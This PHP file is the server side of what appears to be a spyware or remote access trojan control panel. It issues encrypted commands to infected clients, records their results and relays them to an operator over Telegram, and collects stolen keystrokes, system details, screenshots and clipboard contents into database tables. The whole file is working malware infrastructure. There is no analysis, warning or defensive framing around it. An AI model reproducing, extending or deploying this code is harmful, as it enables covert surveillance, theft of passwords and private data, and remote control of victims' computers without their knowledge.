<?php
require_once __DIR__ . '/config.php';
require_once __DIR__ . '/utils.php';
require_once __DIR__ . '/crypto.php';
require_once __DIR__ . '/telegram_handler.php';

class ApiHandler
{
    private $pdo;
    private $crypto;

    public function __construct()
    {
        try {
            $this->pdo = new PDO(
                "mysql:host=" . Config::$DB_HOST . ";dbname=" . Config::$DB_NAME . ";charset=utf8mb4",
                Config::$DB_USER,
                Config::$DB_PASS,
                [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]
            );
            $this->crypto = new Crypto();
        } catch (PDOException $e) {
            $this->log_error("Database connection failed: " . $e->getMessage());
            http_response_code(500);
            echo json_encode(['error' => 'Server error'], JSON_UNESCAPED_UNICODE);
            exit;
        }
    }

    public function handle_request()
    {
        $this->log_webhook();
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            http_response_code(405);
            echo json_encode(['error' => 'Method not allowed'], JSON_UNESCAPED_UNICODE);
            return;
        }

        if (!$this->verify_token()) {
            http_response_code(400);
            echo json_encode(['error' => 'Invalid token'], JSON_UNESCAPED_UNICODE);
            return;
        }

        $action = $_GET['action'] ?? $_POST['action'] ?? '';
        switch ($action) {
            case 'get_commands':
                $this->handle_get_commands();
                break;
            case 'command_response':
                $this->handle_command_response();
                break;
            case 'upload_data':
                $this->handle_upload_data();
                break;
            case 'upload_screenshot':
                $this->handle_upload_screenshot();
                break;
            case 'upload_clipboard':
                $this->handle_upload_clipboard();
                break;
            case 'upload_keystrokes':
                $this->handle_upload_keystrokes();
                break;
            default:
                http_response_code(400);
                echo json_encode(['error' => 'Invalid action'], JSON_UNESCAPED_UNICODE);
        }
    }

    private function verify_token()
    {
        $token = $_POST['token'] ?? '';
        return $token === Config::$SECRET_TOKEN;
    }

    private function handle_get_commands()
    {
        $client_id = Utils::sanitize_input($_POST['client_id'] ?? '');
        if (empty($client_id)) {
            http_response_code(400);
            echo json_encode(['error' => 'Missing client_id'], JSON_UNESCAPED_UNICODE);
            return;
        }

        $stmt = $this->pdo->prepare("
            SELECT id, command
            FROM commands
            WHERE client_id = ? AND status = 'pending'
            ORDER BY created_at ASC
            LIMIT 10
        ");
        $stmt->execute([$client_id]);
        $commands = $stmt->fetchAll(PDO::FETCH_ASSOC);

        $formatted_commands = [];
        foreach ($commands as $command) {
            try {
                $decrypted = json_decode($this->crypto->decrypt($command['command']), true);
                $formatted_commands[] = [
                    'id' => $command['id'],
                    'command' => $command['command'], // ارسال دستور رمزگذاری شده
                    'type' => $decrypted['type'] ?? 'unknown'
                ];
            } catch (Exception $e) {
                continue; // رد کردن دستورات نامعتبر
            }
        }
        

        $stmt = $this->pdo->prepare("
            INSERT INTO clients (client_id, last_seen)
            VALUES (?, NOW())
            ON DUPLICATE KEY UPDATE last_seen = NOW()
        ");
        $stmt->execute([$client_id]);

        echo json_encode($formatted_commands, JSON_UNESCAPED_UNICODE);
    }

    private function handle_command_response()
    {
        try {
            $command_id = Utils::sanitize_input($_POST['command_id'] ?? '');
            if (empty($command_id)) {
                $this->log_error("Missing command_id in command_response");
                http_response_code(400);
                echo json_encode(['error' => 'Missing command_id'], JSON_UNESCAPED_UNICODE);
                return;
            }

            if (!isset($_POST['result'])) {
                $this->log_error("Missing result in command_response");
                http_response_code(400);
                echo json_encode(['error' => 'Missing result'], JSON_UNESCAPED_UNICODE);
                return;
            }

            try {
                $result = json_decode($this->crypto->decrypt($_POST['result']), true);
                if ($result === null && json_last_error() !== JSON_ERROR_NONE) {
                    throw new Exception("JSON decode failed: " . json_last_error_msg());
                }
            } catch (Exception $e) {
                $this->log_error("Decryption or JSON decode failed in command_response: " . $e->getMessage());
                http_response_code(400);
                echo json_encode(['error' => 'Invalid result format'], JSON_UNESCAPED_UNICODE);
                return;
            }

            $stmt = $this->pdo->prepare("
                UPDATE commands SET response = ?, status = 'completed', completed_at = NOW()
                WHERE id = ?
            ");
            $stmt->execute([json_encode($result), $command_id]);

            $chat_id = Utils::get_admin_chat_id($this->pdo);
            if ($chat_id) {
                $message = "Command #$command_id executed:\n<pre>" . json_encode($result, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT) . "</pre>";
                $response = TelegramHandler::send_telegram_message(
                    $chat_id,
                    $message,
                    ['parse_mode' => 'HTML']
                );
                if (!$response) {
                    $this->log_error("Failed to send Telegram message for command #$command_id");
                }
            }

            echo json_encode(['status' => 'success'], JSON_UNESCAPED_UNICODE);
        } catch (Exception $e) {
            $this->log_error("Error in handle_command_response: " . $e->getMessage());
            http_response_code(500);
            echo json_encode(['error' => 'Server error'], JSON_UNESCAPED_UNICODE);
        }
    }

    private function handle_upload_data()
    {
        $client_id = Utils::sanitize_input($_POST['client_id'] ?? '');
        $keystrokes = $_POST['keystrokes'] ?? '';
        $system_info = $_POST['system_info'] ?? '';
    
        if (empty($client_id) || empty($keystrokes) || empty($system_info)) {
            $this->log_error("Missing parameters: client_id=$client_id, keystrokes=" . (empty($keystrokes) ? 'empty' : 'present') . ", system_info=" . (empty($system_info) ? 'empty' : 'present'));
            http_response_code(400);
            echo json_encode(['error' => 'Missing parameters'], JSON_UNESCAPED_UNICODE);
            return;
        }
    
        try {
            $keystrokes_decrypted = $this->crypto->decrypt($keystrokes);
            $system_info_decrypted = json_decode($this->crypto->decrypt($system_info), true);
            if ($system_info_decrypted === null) {
                throw new Exception("Invalid system_info JSON");
            }
    
            $stmt = $this->pdo->prepare("
                INSERT INTO client_data (client_id, keystrokes, system_info, received_at)
                VALUES (?, ?, ?, NOW())
            ");
            $stmt->execute([$client_id, $keystrokes_decrypted, json_encode($system_info_decrypted)]);
    
            echo json_encode(['status' => 'success'], JSON_UNESCAPED_UNICODE);
        } catch (Exception $e) {
            $this->log_error("Upload data failed: " . $e->getMessage());
            http_response_code(500);
            echo json_encode(['error' => 'Server error: ' . $e->getMessage()], JSON_UNESCAPED_UNICODE);
        }
    }

    private function handle_upload_screenshot()
    {
        $client_id = Utils::sanitize_input($_POST['client_id'] ?? '');
        $image_data = $_POST['image_data'] ?? '';

        if (empty($client_id) || empty($image_data)) {
            http_response_code(400);
            echo json_encode(['error' => 'Missing parameters'], JSON_UNESCAPED_UNICODE);
            return;
        }

        $image_data = $this->crypto->decrypt($image_data);
        $filename = 'screenshots/' . $client_id . '_' . time() . '.png';
        if (!file_exists('screenshots')) {
            mkdir('screenshots', 0755, true);
        }

        file_put_contents($filename, base64_decode($image_data));

        $stmt = $this->pdo->prepare("
            INSERT INTO screenshots (client_id, filename, created_at)
            VALUES (?, ?, NOW())
        ");
        $stmt->execute([$client_id, $filename]);

        echo json_encode(['status' => 'success'], JSON_UNESCAPED_UNICODE);
    }

    private function handle_upload_clipboard()
    {
        $client_id = Utils::sanitize_input($_POST['client_id'] ?? '');
        $clipboard_data = $this->crypto->decrypt($_POST['clipboard_data'] ?? '');

        if (empty($client_id) || empty($clipboard_data)) {
            http_response_code(400);
            echo json_encode(['error' => 'Missing parameters'], JSON_UNESCAPED_UNICODE);
            return;
        }

        $stmt = $this->pdo->prepare("
            INSERT INTO clipboard_logs (client_id, content, created_at)
            VALUES (?, ?, NOW())
        ");
        $stmt->execute([$client_id, $clipboard_data]);

        echo json_encode(['status' => 'success'], JSON_UNESCAPED_UNICODE);
    }

    private function handle_upload_keystrokes()
    {
        $client_id = Utils::sanitize_input($_POST['client_id'] ?? '');
        $keystrokes = $this->crypto->decrypt($_POST['keystrokes'] ?? '');

        if (empty($client_id) || empty($keystrokes)) {
            http_response_code(400);
            echo json_encode(['error' => 'Missing parameters'], JSON_UNESCAPED_UNICODE);
            return;
        }

        $stmt = $this->pdo->prepare("
            INSERT INTO keystroke_logs (client_id, content, created_at)
            VALUES (?, ?, NOW())
        ");
        $stmt->execute([$client_id, $keystrokes]);

        echo json_encode(['status' => 'success'], JSON_UNESCAPED_UNICODE);
    }

    private function log_error($message) {
        $log_message = date('Y-m-d H:i:s') . " - ERROR - " . $message . " - File: " . __FILE__ . " - Line: " . __LINE__ . PHP_EOL;
        file_put_contents(Config::$ERROR_LOG, $log_message, FILE_APPEND);
    }

    private function log_webhook()
    {
        $data = [
            'time' => date('Y-m-d H:i:s'),
            'method' => $_SERVER['REQUEST_METHOD'],
            'post' => $_POST,
            'get' => $_GET,
            'input' => file_get_contents('php://input')
        ];
        file_put_contents(Config::$WEBHOOK_LOG, json_encode($data, JSON_UNESCAPED_UNICODE) . PHP_EOL, FILE_APPEND);
    }
}

$handler = new ApiHandler();
$handler->handle_request();
?>